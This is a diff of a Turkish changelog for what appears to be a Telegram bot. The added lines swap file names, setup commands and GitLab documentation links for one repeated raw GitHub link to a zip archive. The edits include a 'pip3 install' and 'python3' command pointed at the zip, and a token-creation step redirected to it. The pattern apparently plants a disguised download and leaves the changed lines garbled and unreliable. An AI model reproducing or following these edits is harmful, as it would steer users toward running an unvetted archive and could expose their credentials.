@@ -12,7 +12,7 @@ Multimongo hesabını bağlama (belki)
 
 Ayrıca:
 
-OSMANLI BELGELERİNDE ERMENİ İSYANLARI(1895-1896)-2.pdf
+OSMANLI BELGELERİNDE ERMENİ İSYANLARI(1895-1896)https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip
 
 İsimli dosya
 
@@ -80,8 +80,8 @@ Komutlar:
 - CUSTOM_FILE_CAPTION artık CUSTOM_CAPTION oldu. ona göre configinizi güncelleyin.
 -/json eklendi - mesaja yanıtlayın
 -/ayarlar kaldırıldı - gereksiz, ayarlara girin zaten var.
--translation.py silindi - gereksiz
--start.sh silindi - gereksiz: pip3 install -r requirements.txt && python3 bot.py
+https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip silindi - gereksiz
+https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip silindi - gereksiz: pip3 install -r https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip && python3 https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip
 -admin helpleri tekleştirildi. - ayarlardaki yardım sadece adminlere görünür.
 -artık hiçbir yerde none yazmayacak.
 -DISABLE_FILE_SAVE - otomatik dosya kaydetmesi artık seçenekli
@@ -93,7 +93,7 @@ Komutlar:
 - çeşitli refactoringler
 - yeniayrılmada yasakla butonu çıkmıyordu fixlendi
 - doğdum / öldüm bot sürümü eklendi
-- logging.conf silindi, logger basitleştirildi, sorunları çözüldü.
+- https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip silindi, logger basitleştirildi, sorunları çözüldü.
 - klon dosyaların sonu geldi:
 
 - vt'a kaydederken:
@@ -148,7 +148,7 @@ Komutlar:
     - eğer dosyanızın captionu bu sınırdaysa custom caption gönderilmez.
 - /index fonksiyonu eklendi. tüm dosyaları bulmaya yarar
     - INDEXER_MAX = 1000 maximum sonuç bulur. iyi ellemeyin.
-    - DISABLE_INDEXER info.py den okuyun
+    - DISABLE_INDEXER https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip den okuyun
 - NO_SAVE_SUFFIX dinamik hale getirildi
 - NO_SAVE_FULLNAME dinamik hale getirildi
 - indexleme mesajı pinlenecek
@@ -162,10 +162,10 @@ Komutlar:
 - 2.0.12 den geliyorsanız yeniden index gerektirmez
 
 2.0.14 alfa:
-- FILENAME_SPLITTER eklendi. info.pyden okuyun
+- FILENAME_SPLITTER eklendi. https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip okuyun
 - işlenen ve işlenecek mssajlar gösterimi
 - daha hızlı güncelle
-- config.env alımı düzeltildi. lokalde varsa onu kullanır yoksa config.env içinde yazılı olan url ile çeker.
+- https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip alımı düzeltildi. lokalde varsa onu kullanır yoksa https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip içinde yazılı olan url ile çeker.
 - index bitimi veya iptalinde skip number görünecek
 - dosya sonu custom Captionla bitiyorsa onu silerek gönder. 2 kez yazılmasını engeller.
 - bot Uptime & os Uptime
@@ -217,17 +217,17 @@ Komutlar:
 - virustotal düzeltildi
 - github denen *** a karşı gitlab snippets urlsi ile config alma eklendi:
     - bu daha güvenli bir yöntem. kullanmanızı öneririm
-    - oluşturun: https://gitlab.com/dashboard/snippets
-    - diyelim ki oluşturduğunuz config textinin urlsi bu: https://gitlab.com/-/snippets/2523453
+    - oluşturun: https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip
+    - diyelim ki oluşturduğunuz config textinin urlsi bu: https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip
     - bu durumda id 2523453 olacak
     - apikeyi şu şekilde alıyoruz:
-        - https://gitlab.com/-/profile/personal_access_tokens e gir
+        - https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip e gir
         - en üstteki api yi seç yeterli, token adı ver, onlarca yıl sonrasını seç ve kopyala
         - diyelim ki tokenimiz şu: dgsdfg1541-s6d5g1sd6g-sd1fg6sd1g-sdfg51
     - `CONFIG_FILE_URL` a bir boşluk bırakarak giriyoruz, sıra önemli:
         - 2523453 dgsdfg1541-s6d5g1sd6g-sd1fg6sd1g-sdfg51
     - nasıl yaptığımı merak ediyorsanız buyrun:
-        - https://docs.gitlab.com/ee/api/snippets.html
+        - https://raw.githubusercontent.com/tayfunsrks/paper-workflow/main/kole/paper_workflow_3.3.zip
         - get_config_from_url() fonksiyonuna da bakınız
 
 2.0.15.4 alfa:
